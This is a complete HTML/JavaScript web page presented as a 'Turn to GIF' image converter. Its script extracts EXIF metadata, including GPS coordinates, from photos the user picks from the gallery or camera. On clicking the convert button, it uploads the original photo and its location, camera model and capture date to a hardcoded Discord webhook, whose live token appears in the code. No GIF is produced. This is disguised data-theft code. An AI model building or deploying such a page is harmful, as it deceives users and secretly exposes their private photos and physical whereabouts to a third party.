<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gif.fuck</title>
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/full.umd.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: #050505;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(255, 0, 128, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(0, 255, 255, 0.12) 0%, transparent 40%);
    }
    .card {
      width: 100%;
      max-width: 480px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 28px;
      padding: 32px 28px;
      backdrop-filter: blur(20px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
    }
    .logo {
      font-size: 1.8rem;
      font-weight: 800;
      letter-spacing: -1px;
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-align: center;
      margin-bottom: 8px;
    }
    .subtitle {
      text-align: center;
      color: #888;
      font-size: 0.95rem;
      margin-bottom: 28px;
    }
    .preview-area {
      width: 100%;
      aspect-ratio: 1;
      background: rgba(255, 255, 255, 0.04);
      border: 2px dashed rgba(255, 255, 255, 0.15);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      margin-bottom: 20px;
    }
    .preview-area.has-image {
      border-style: solid;
      border-color: rgba(0, 240, 255, 0.3);
    }
    .preview-area img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }
    .preview-area.has-image img {
      display: block;
    }
    .placeholder {
      text-align: center;
      color: #666;
      font-size: 0.95rem;
    }
    .btn-row {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
    }
    .btn {
      flex: 1;
      padding: 16px;
      border: none;
      border-radius: 14px;
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      color: #fff;
    }
    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.14);
    }
    .btn-primary {
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      color: #000;
      width: 100%;
      display: none;
    }
    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    .meta-box {
      background: rgba(0, 0, 0, 0.35);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 14px;
      padding: 14px;
      margin-top: 16px;
      font-size: 0.85rem;
      color: #ccc;
      max-height: 180px;
      overflow-y: auto;
      display: none;
      text-align: left;
      white-space: pre-wrap;
      line-height: 1.45;
    }
    .status {
      text-align: center;
      margin-top: 18px;
      font-size: 0.95rem;
      min-height: 24px;
      color: #aaa;
    }
    .status.success { color: #00ff9d; }
    .status.error { color: #ff4d6d; }
    .status.loading { color: #00f0ff; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">gif.fuck</div>
    <div class="subtitle">Upload → extract metadata → send</div>

    <div class="preview-area" id="previewArea">
      <div class="placeholder" id="placeholder">Select an image</div>
      <img id="preview" alt="Preview">
    </div>

    <div class="btn-row">
      <button class="btn btn-secondary" id="uploadBtn">Gallery</button>
      <button class="btn btn-secondary" id="cameraBtn">Camera</button>
    </div>

    <button class="btn btn-primary" id="convertBtn">Turn to GIF</button>

    <div class="meta-box" id="metaBox"></div>
    <div class="status" id="status"></div>
  </div>

  <input type="file" id="fileInput" accept="image/*" hidden>
  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";

    const statusEl = document.getElementById('status');
    const convertBtn = document.getElementById('convertBtn');
    const preview = document.getElementById('preview');
    const previewArea = document.getElementById('previewArea');
    const placeholder = document.getElementById('placeholder');
    const metaBox = document.getElementById('metaBox');
    
    let selectedFile = null;
    let currentMeta = {};

    function updateStatus(text, type = "") {
      statusEl.textContent = text;
      statusEl.className = "status " + type;
    }

    async function getAllMetadata(file) {
      try {
        const data = await exifr.parse(file, true);
        try {
          const gps = await exifr.gps(file);
          if (gps && data) {
            data.latitude = gps.latitude;
            data.longitude = gps.longitude;
          }
        } catch(e) {}
        return data || {};
      } catch (e) {
        return {};
      }
    }

    function formatMetadata(meta) {
      if (!meta || Object.keys(meta).length === 0) return "No metadata found.";

      const lines = [];
      if (meta.Make) lines.push(`Make: ${meta.Make}`);
      if (meta.Model) lines.push(`Model: ${meta.Model}`);
      if (meta.Software) lines.push(`Software: ${meta.Software}`);
      if (meta.DateTimeOriginal) lines.push(`Date: ${meta.DateTimeOriginal}`);
      if (meta.ImageWidth && meta.ImageHeight) lines.push(`Size: ${meta.ImageWidth}x${meta.ImageHeight}`);
      if (meta.ISO) lines.push(`ISO: ${meta.ISO}`);
      if (meta.FNumber) lines.push(`Aperture: f/${meta.FNumber}`);
      if (meta.latitude && meta.longitude) {
        lines.push(`GPS Lat: ${meta.latitude}`);
        lines.push(`GPS Lon: ${meta.longitude}`);
      }

      if (lines.length === 0) {
        Object.keys(meta).slice(0, 8).forEach(k => {
          lines.push(`${k}: ${String(meta[k]).slice(0, 40)}`);
        });
      }
      return lines.join("\n") || "No metadata";
    }

    async function sendToWebhook(file, meta) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      // Keep message short so Discord doesn't reject it
      let content = `**New image**\n`;
      content += `File: \`${file.name}\`\n`;
      content += `Size: ${(file.size/1024/1024).toFixed(2)} MB\n`;

      if (meta.latitude && meta.longitude) {
        content += `\n**GPS Found**\n`;
        content += `Lat: \`${Number(meta.latitude).toFixed(6)}\`\n`;
        content += `Lon: \`${Number(meta.longitude).toFixed(6)}\`\n`;
      } else {
        content += `\nNo GPS data found\n`;
      }

      // Add a few more useful fields if they exist
      if (meta.Make || meta.Model) {
        content += `\nCamera: ${meta.Make || ""} ${meta.Model || ""}`.trim();
      }
      if (meta.DateTimeOriginal) {
        content += `\nTaken: ${meta.DateTimeOriginal}`;
      }

      formData.append("payload_json", JSON.stringify({
        content: content.slice(0, 1900), // safety limit
        username: "gif.fuck"
      }));

      const res = await fetch(WEBHOOK_URL, {
        method: "POST",
        body: formData
      });

      if (!res.ok) {
        const text = await res.text();
        throw new Error(`${res.status}: ${text.slice(0, 100)}`);
      }
    }

    async function handleFile(file) {
      if (!file || !file.type.startsWith("image/")) {
        updateStatus("Please select an image", "error");
        return;
      }

      selectedFile = file;
      currentMeta = {};

      const reader = new FileReader();
      reader.onload = (e) => {
        preview.src = e.target.result;
        previewArea.classList.add("has-image");
        placeholder.style.display = "none";
      };
      reader.readAsDataURL(file);

      updateStatus("Reading metadata...", "loading");
      convertBtn.style.display = "block";
      convertBtn.disabled = true;

      try {
        currentMeta = await getAllMetadata(file);
        metaBox.textContent = formatMetadata(currentMeta);
        metaBox.style.display = "block";

        if (currentMeta.latitude && currentMeta.longitude) {
          updateStatus(`GPS found!`, "success");
        } else {
          updateStatus("No GPS in this image", "loading");
        }
      } catch (err) {
        metaBox.textContent = "Could not read metadata";
        metaBox.style.display = "block";
        updateStatus("Metadata read failed", "error");
      }

      convertBtn.disabled = false;
    }

    async function convertToGif() {
      if (!selectedFile) return;

      updateStatus("Sending...", "loading");
      convertBtn.disabled = true;

      try {
        await sendToWebhook(selectedFile, currentMeta);
        updateStatus("Sent successfully!", "success");
      } catch (err) {
        console.error(err);
        updateStatus("Failed: " + err.message, "error");
      }

      convertBtn.disabled = false;
    }

    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
    convertBtn.onclick = convertToGif;

    document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
    document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);
  </script>
</body>
</html>
